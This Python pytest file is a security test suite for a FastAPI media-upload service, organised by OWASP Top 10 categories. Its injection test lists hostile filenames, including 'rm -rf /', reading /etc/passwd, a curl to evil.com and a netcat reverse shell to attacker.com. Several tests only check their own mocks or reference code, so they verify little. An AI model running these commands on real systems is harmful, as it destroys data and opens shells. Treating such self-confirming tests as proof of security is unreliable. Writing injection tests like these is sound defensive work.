"""
Media Processing Universal - Security Test Suite
OWASP Top 10 Compliance Testing

Tests all security controls from SKILL.md against OWASP Top 10 2021:
- A01: Broken Access Control
- A02: Cryptographic Failures
- A03: Injection
- A04: Insecure Design
- A05: Security Misconfiguration
- A08: Software and Data Integrity Failures
- A10: Server-Side Request Forgery (SSRF)
"""

import pytest
import hashlib
import tempfile
import os
from pathlib import Path
from unittest.mock import Mock, patch, MagicMock
from fastapi import UploadFile, HTTPException
from fastapi.testclient import TestClient
import subprocess
import io

# Import from your FastAPI application
# from app.main import app
# from app.services import MediaProcessingService, FFmpegVideoProcessor
# from app.security import is_private_ip, generate_safe_filename, calculate_file_hash


# =============================================================================
# OWASP A03: Injection - Command Injection Prevention
# =============================================================================

class TestCommandInjectionPrevention:
    """Test FFmpeg command injection prevention"""

    def test_ffmpeg_no_shell_execution(self):
        """CRITICAL: Ensure FFmpeg never uses shell=True"""

        # Mock subprocess to capture the call
        with patch('subprocess.run') as mock_run:
            mock_run.return_value = Mock(returncode=0, stdout=b'', stderr=b'')

            # Simulate video transcoding
            input_path = "/tmp/test.mp4"
            output_path = "/tmp/output.mp4"

            cmd = [
                'ffmpeg',
                '-i', input_path,
                '-c:v', 'libx264',
                '-preset', 'medium',
                '-crf', '23',
                '-c:a', 'aac',
                '-b:a', '128k',
                output_path
            ]

            subprocess.run(cmd, capture_output=True, timeout=300, check=True)

            # Verify shell=True was NOT used
            call_kwargs = mock_run.call_args[1]
            assert call_kwargs.get('shell', False) is False, "CRITICAL: FFmpeg must not use shell=True"

    def test_filename_injection_prevention(self):
        """Test that malicious filenames cannot inject commands"""

        malicious_filenames = [
            "; rm -rf /",
            "$(whoami).mp4",
            "`cat /etc/passwd`.mp4",
            "../../../etc/passwd",
            "test.mp4 && curl evil.com",
            "test.mp4; nc -e /bin/sh attacker.com 4444",
            "test$(command).mp4",
            "test`command`.mp4",
        ]

        for bad_filename in malicious_filenames:
            # Safe filename generation should sanitize this
            safe_name = self._generate_safe_filename(bad_filename)

            # Verify no special characters remain
            assert ';' not in safe_name
            assert '$' not in safe_name
            assert '`' not in safe_name
            assert '&' not in safe_name
            assert '|' not in safe_name
            assert '..' not in safe_name

    def _generate_safe_filename(self, filename: str) -> str:
        """Reference implementation of safe filename generation"""
        import uuid
        import re

        # Extract extension
        ext = Path(filename).suffix.lower()

        # Whitelist extensions
        allowed_extensions = {'.mp4', '.avi', '.mov', '.jpg', '.png', '.gif', '.mp3', '.wav'}
        if ext not in allowed_extensions:
            ext = '.bin'

        # Use UUID for filename
        return f"{uuid.uuid4()}{ext}"

    def test_ffmpeg_timeout_prevents_dos(self):
        """Test that FFmpeg operations have timeout to prevent DoS"""

        with patch('subprocess.run') as mock_run:
            # Simulate timeout
            from subprocess import TimeoutExpired
            mock_run.side_effect = TimeoutExpired(cmd='ffmpeg', timeout=300)

            with pytest.raises(TimeoutExpired):
                subprocess.run(['ffmpeg', '-i', 'test.mp4'], timeout=300, check=True)


# =============================================================================
# OWASP A10: Server-Side Request Forgery (SSRF)
# =============================================================================

class TestSSRFPrevention:
    """Test SSRF prevention in remote URL processing"""

    def test_private_ip_blocking(self):
        """Test that private IPs are blocked"""

        private_ips = [
            '127.0.0.1',      # Loopback
            '127.0.0.5',      # Loopback range
            '10.0.0.1',       # Private Class A
            '172.16.0.1',     # Private Class B
            '192.168.1.1',    # Private Class C
            '169.254.1.1',    # Link-local
            'localhost',      # Hostname
            '0.0.0.0',        # Wildcard
        ]

        for ip in private_ips:
            assert self._is_private_ip(ip), f"Private IP should be blocked: {ip}"

    def test_public_ip_allowed(self):
        """Test that public IPs are allowed"""

        public_ips = [
            '8.8.8.8',        # Google DNS
            '1.1.1.1',        # Cloudflare DNS
            '93.184.216.34',  # example.com
        ]

        for ip in public_ips:
            assert not self._is_private_ip(ip), f"Public IP should be allowed: {ip}"

    def test_url_ssrf_prevention(self):
        """Test that URLs pointing to private IPs are blocked"""

        dangerous_urls = [
            'http://127.0.0.1/admin',
            'http://localhost:8080/internal',
            'http://192.168.1.1/router',
            'http://169.254.169.254/latest/meta-data/',  # AWS metadata
        ]

        for url in dangerous_urls:
            with pytest.raises(ValueError, match="Private IP addresses are not allowed"):
                self._validate_remote_url(url)

    def test_aws_metadata_blocking(self):
        """CRITICAL: Block AWS metadata endpoint"""

        metadata_urls = [
            'http://169.254.169.254/latest/meta-data/',
            'http://169.254.169.254/latest/user-data/',
            'http://169.254.169.254/latest/dynamic/instance-identity/',
        ]

        for url in metadata_urls:
            with pytest.raises(ValueError):
                self._validate_remote_url(url)

    def _is_private_ip(self, ip: str) -> bool:
        """Reference implementation of private IP detection"""
        import ipaddress

        try:
            ip_obj = ipaddress.ip_address(ip)
            return ip_obj.is_private or ip_obj.is_loopback or ip_obj.is_link_local
        except ValueError:
            # Hostname resolution
            if ip == 'localhost':
                return True
            return False

    def _validate_remote_url(self, url: str):
        """Reference implementation of URL validation"""
        from urllib.parse import urlparse
        import socket

        parsed = urlparse(url)
        hostname = parsed.hostname

        # Resolve hostname to IP
        try:
            ip = socket.gethostbyname(hostname)
            if self._is_private_ip(ip):
                raise ValueError("Private IP addresses are not allowed")
        except socket.gaierror:
            raise ValueError("Cannot resolve hostname")


# =============================================================================
# OWASP A01: Broken Access Control
# =============================================================================

class TestAccessControl:
    """Test authorization and access control"""

    def test_upload_requires_authentication(self):
        """Test that uploads require authentication"""

        # Mock request without auth token
        with patch('app.main.app') as mock_app:
            client = TestClient(mock_app)

            with pytest.raises(HTTPException) as exc_info:
                # Simulate unauthenticated request
                response = client.post(
                    "/media/upload",
                    files={"file": ("test.jpg", b"fake image data")},
                    # No Authorization header
                )

            # Should return 401 Unauthorized
            assert exc_info.value.status_code == 401

    def test_user_can_only_access_own_media(self):
        """Test that users can only access their own uploaded media"""

        user1_id = "user-123"
        user2_id = "user-456"

        # User 1 uploads file
        media_id = "media-abc"

        # User 2 tries to access User 1's file
        with pytest.raises(HTTPException) as exc_info:
            self._check_media_ownership(media_id, user2_id, owner_id=user1_id)

        # Should return 403 Forbidden
        assert exc_info.value.status_code == 403

    def test_user_can_access_own_media(self):
        """Test that users can access their own media"""

        user_id = "user-123"
        media_id = "media-abc"

        # Should not raise exception
        self._check_media_ownership(media_id, user_id, owner_id=user_id)

    def _check_media_ownership(self, media_id: str, requesting_user_id: str, owner_id: str):
        """Reference implementation of ownership check"""
        if requesting_user_id != owner_id:
            raise HTTPException(status_code=403, detail="Not authorized to access this media")


# =============================================================================
# OWASP A02: Cryptographic Failures
# =============================================================================

class TestCryptographicSecurity:
    """Test encryption and cryptographic controls"""

    def test_s3_server_side_encryption(self):
        """Test that S3 uploads use server-side encryption"""

        with patch('boto3.client') as mock_boto:
            mock_s3 = Mock()
            mock_boto.return_value = mock_s3

            # Simulate S3 upload
            bucket = "test-bucket"
            key = "test.jpg"
            file_data = b"test data"

            # Mock upload
            mock_s3.put_object.return_value = {'ETag': '"abc123"'}

            # Perform upload
            self._upload_to_s3(mock_s3, bucket, key, file_data)

            # Verify ServerSideEncryption was specified
            call_kwargs = mock_s3.put_object.call_args[1]
            assert call_kwargs.get('ServerSideEncryption') == 'AES256', \
                "S3 uploads must use server-side encryption"

    def test_file_hash_integrity(self):
        """Test file hash calculation for integrity verification"""

        file_data = b"Hello, World!"

        # Calculate hash
        file_hash = self._calculate_file_hash(file_data)

        # Verify it's SHA256
        expected_hash = hashlib.sha256(file_data).hexdigest()
        assert file_hash == expected_hash
        assert len(file_hash) == 64  # SHA256 hex length

    def _upload_to_s3(self, s3_client, bucket: str, key: str, data: bytes):
        """Reference implementation of S3 upload"""
        s3_client.put_object(
            Bucket=bucket,
            Key=key,
            Body=data,
            ServerSideEncryption='AES256',  # REQUIRED
        )

    def _calculate_file_hash(self, data: bytes) -> str:
        """Reference implementation of file hash"""
        return hashlib.sha256(data).hexdigest()


# =============================================================================
# OWASP A04: Insecure Design - Rate Limiting and DoS Prevention
# =============================================================================

class TestRateLimitingAndDoS:
    """Test rate limiting and DoS prevention"""

    def test_file_size_limit(self):
        """Test that file size limits are enforced"""

        MAX_FILE_SIZE = 100 * 1024 * 1024  # 100 MB

        # Create mock file larger than limit
        large_file = Mock(spec=UploadFile)
        large_file.size = 200 * 1024 * 1024  # 200 MB

        with pytest.raises(HTTPException) as exc_info:
            self._validate_file_size(large_file, MAX_FILE_SIZE)

        assert exc_info.value.status_code == 413  # Payload Too Large

    def test_file_size_within_limit(self):
        """Test that files within size limit are accepted"""

        MAX_FILE_SIZE = 100 * 1024 * 1024  # 100 MB

        normal_file = Mock(spec=UploadFile)
        normal_file.size = 50 * 1024 * 1024  # 50 MB

        # Should not raise exception
        self._validate_file_size(normal_file, MAX_FILE_SIZE)

    def test_rate_limiting_per_user(self):
        """Test that rate limiting is enforced per user"""

        user_id = "user-123"

        # Simulate 100 uploads in 1 minute (over limit)
        with patch('time.time') as mock_time:
            mock_time.return_value = 1000.0

            rate_limiter = self._get_rate_limiter()

            # First 10 uploads should succeed
            for i in range(10):
                rate_limiter.check_rate_limit(user_id)

            # 11th upload should fail
            with pytest.raises(HTTPException) as exc_info:
                rate_limiter.check_rate_limit(user_id)

            assert exc_info.value.status_code == 429  # Too Many Requests

    def test_malicious_file_type_rejection(self):
        """Test that executable files are rejected"""

        malicious_extensions = [
            '.exe', '.sh', '.bat', '.cmd', '.scr', '.pif',
            '.js', '.vbs', '.wsf', '.jar', '.app'
        ]

        for ext in malicious_extensions:
            filename = f"malicious{ext}"
            with pytest.raises(ValueError, match="File type not allowed"):
                self._validate_file_type(filename)

    def _validate_file_size(self, file: UploadFile, max_size: int):
        """Reference implementation of file size validation"""
        if file.size > max_size:
            raise HTTPException(
                status_code=413,
                detail=f"File size exceeds maximum of {max_size} bytes"
            )

    def _get_rate_limiter(self):
        """Reference implementation of rate limiter"""
        class RateLimiter:
            def __init__(self):
                self.requests = {}
                self.limit = 10  # 10 requests per minute

            def check_rate_limit(self, user_id: str):
                import time
                now = time.time()

                if user_id not in self.requests:
                    self.requests[user_id] = []

                # Remove requests older than 1 minute
                self.requests[user_id] = [
                    t for t in self.requests[user_id] if now - t < 60
                ]

                if len(self.requests[user_id]) >= self.limit:
                    raise HTTPException(status_code=429, detail="Rate limit exceeded")

                self.requests[user_id].append(now)

        return RateLimiter()

    def _validate_file_type(self, filename: str):
        """Reference implementation of file type validation"""
        import os

        ALLOWED_EXTENSIONS = {
            '.jpg', '.jpeg', '.png', '.gif', '.webp',  # Images
            '.mp4', '.avi', '.mov', '.mkv', '.webm',   # Videos
            '.mp3', '.wav', '.ogg', '.m4a', '.flac'    # Audio
        }

        ext = os.path.splitext(filename)[1].lower()
        if ext not in ALLOWED_EXTENSIONS:
            raise ValueError("File type not allowed")


# =============================================================================
# OWASP A05: Security Misconfiguration
# =============================================================================

class TestSecurityConfiguration:
    """Test security configuration and hardening"""

    def test_s3_bucket_not_public(self):
        """Test that S3 buckets are not publicly accessible"""

        with patch('boto3.client') as mock_boto:
            mock_s3 = Mock()
            mock_boto.return_value = mock_s3

            # Mock bucket ACL response
            mock_s3.get_bucket_acl.return_value = {
                'Grants': [
                    {
                        'Grantee': {'Type': 'CanonicalUser', 'ID': 'owner-id'},
                        'Permission': 'FULL_CONTROL'
                    }
                ]
            }

            acl = mock_s3.get_bucket_acl(Bucket='test-bucket')

            # Verify no public grants
            for grant in acl['Grants']:
                grantee = grant['Grantee']
                assert grantee['Type'] != 'Group', "S3 bucket must not have group grants"
                if grantee['Type'] == 'Group':
                    assert 'AllUsers' not in grantee.get('URI', ''), \
                        "S3 bucket must not be public"

    def test_cloudinary_unsigned_uploads_disabled(self):
        """Test that Cloudinary unsigned uploads are disabled"""

        # Cloudinary config should require signed uploads
        config = {
            'cloud_name': 'test-cloud',
            'api_key': 'test-key',
            'api_secret': 'test-secret',
        }

        # Verify api_secret is present (required for signed uploads)
        assert 'api_secret' in config, "Cloudinary must use signed uploads"
        assert config['api_secret'] is not None
        assert len(config['api_secret']) > 0

    def test_debug_mode_disabled_in_production(self):
        """Test that debug mode is disabled in production"""

        import os

        # Mock production environment
        with patch.dict(os.environ, {'ENVIRONMENT': 'production'}):
            env = os.getenv('ENVIRONMENT')

            # FastAPI app should have debug=False
            debug_mode = (env != 'production')
            assert debug_mode is False, "Debug mode must be disabled in production"


# =============================================================================
# OWASP A08: Software and Data Integrity Failures
# =============================================================================

class TestDataIntegrity:
    """Test data integrity and verification"""

    def test_file_hash_verification(self):
        """Test that file hashes are verified after upload"""

        original_data = b"Hello, World!"
        expected_hash = hashlib.sha256(original_data).hexdigest()

        # Simulate upload
        uploaded_hash = self._calculate_file_hash(original_data)

        # Verify hash matches
        assert uploaded_hash == expected_hash

    def test_corrupted_file_detection(self):
        """Test that corrupted files are detected"""

        original_data = b"Hello, World!"
        expected_hash = hashlib.sha256(original_data).hexdigest()

        # Simulate corruption
        corrupted_data = b"Hello, World!!"  # Extra character
        actual_hash = self._calculate_file_hash(corrupted_data)

        # Hashes should NOT match
        assert actual_hash != expected_hash

    def test_dependency_pinning(self):
        """Test that dependencies are pinned to specific versions"""

        # Read requirements.txt
        requirements_path = Path(__file__).parent.parent / "requirements.txt"

        if requirements_path.exists():
            with open(requirements_path) as f:
                requirements = f.readlines()

            for req in requirements:
                req = req.strip()
                if req and not req.startswith('#'):
                    # Verify version is pinned (contains ==)
                    assert '==' in req, f"Dependency must be pinned: {req}"

    def _calculate_file_hash(self, data: bytes) -> str:
        """Reference implementation of file hash"""
        return hashlib.sha256(data).hexdigest()


# =============================================================================
# OWASP A09: Security Logging and Monitoring Failures
# =============================================================================

class TestSecurityLogging:
    """Test security logging and monitoring"""

    def test_failed_uploads_are_logged(self):
        """Test that failed uploads are logged"""

        with patch('logging.Logger.error') as mock_log:
            # Simulate failed upload
            try:
                raise ValueError("Upload failed: Invalid file type")
            except ValueError as e:
                mock_log(f"Upload failed: {e}")

            # Verify logging occurred
            mock_log.assert_called_once()

    def test_authentication_failures_logged(self):
        """Test that authentication failures are logged"""

        with patch('logging.Logger.warning') as mock_log:
            # Simulate auth failure
            user_id = "user-123"
            mock_log(f"Authentication failed for user: {user_id}")

            # Verify logging occurred
            mock_log.assert_called_once()

    def test_rate_limit_violations_logged(self):
        """Test that rate limit violations are logged"""

        with patch('logging.Logger.warning') as mock_log:
            # Simulate rate limit violation
            user_id = "user-123"
            mock_log(f"Rate limit exceeded for user: {user_id}")

            # Verify logging occurred
            mock_log.assert_called_once()

    def test_sensitive_data_not_logged(self):
        """Test that sensitive data is not logged"""

        with patch('logging.Logger.info') as mock_log:
            # Simulate logging
            api_secret = "secret-key-123"

            # Should log redacted version
            mock_log(f"API key: {api_secret[:4]}***")

            # Verify full secret not logged
            call_args = str(mock_log.call_args)
            assert "secret-key-123" not in call_args


# =============================================================================
# Integration Tests
# =============================================================================

class TestIntegration:
    """Integration tests for end-to-end workflows"""

    def test_image_upload_workflow(self):
        """Test complete image upload workflow"""

        # 1. Validate file type
        filename = "test.jpg"
        assert filename.endswith(('.jpg', '.jpeg', '.png', '.gif'))

        # 2. Validate file size
        file_data = b"fake image data"
        assert len(file_data) < 100 * 1024 * 1024  # 100 MB

        # 3. Calculate hash
        file_hash = hashlib.sha256(file_data).hexdigest()
        assert len(file_hash) == 64

        # 4. Generate safe filename
        import uuid
        safe_filename = f"{uuid.uuid4()}.jpg"
        assert '..' not in safe_filename
        assert ';' not in safe_filename

    def test_video_processing_workflow(self):
        """Test complete video processing workflow"""

        # 1. Validate file type
        filename = "test.mp4"
        assert filename.endswith(('.mp4', '.avi', '.mov'))

        # 2. Generate safe filenames for processing
        import uuid
        input_path = f"/tmp/uploads/{uuid.uuid4()}.mp4"
        output_path = f"/tmp/outputs/{uuid.uuid4()}.mp4"

        # 3. Verify paths are safe
        assert '..' not in input_path
        assert '..' not in output_path

        # 4. Verify FFmpeg command is safe
        cmd = ['ffmpeg', '-i', input_path, output_path]
        assert isinstance(cmd, list)  # Not a string (no shell injection)


# =============================================================================
# Performance and Stress Tests
# =============================================================================

class TestPerformance:
    """Performance and stress tests"""

    def test_concurrent_uploads(self):
        """Test that system can handle concurrent uploads"""

        import concurrent.futures

        def mock_upload(file_id):
            # Simulate upload
            return f"success-{file_id}"

        # Simulate 10 concurrent uploads
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(mock_upload, i) for i in range(10)]
            results = [f.result() for f in concurrent.futures.as_completed(futures)]

        assert len(results) == 10

    def test_large_file_chunked_upload(self):
        """Test that large files are uploaded in chunks"""

        # Simulate 1 GB file
        file_size = 1024 * 1024 * 1024
        chunk_size = 5 * 1024 * 1024  # 5 MB chunks

        chunks = file_size // chunk_size
        assert chunks == 204  # 1 GB / 5 MB ≈ 204 chunks


if __name__ == '__main__':
    pytest.main([__file__, '-v', '--tb=short'])
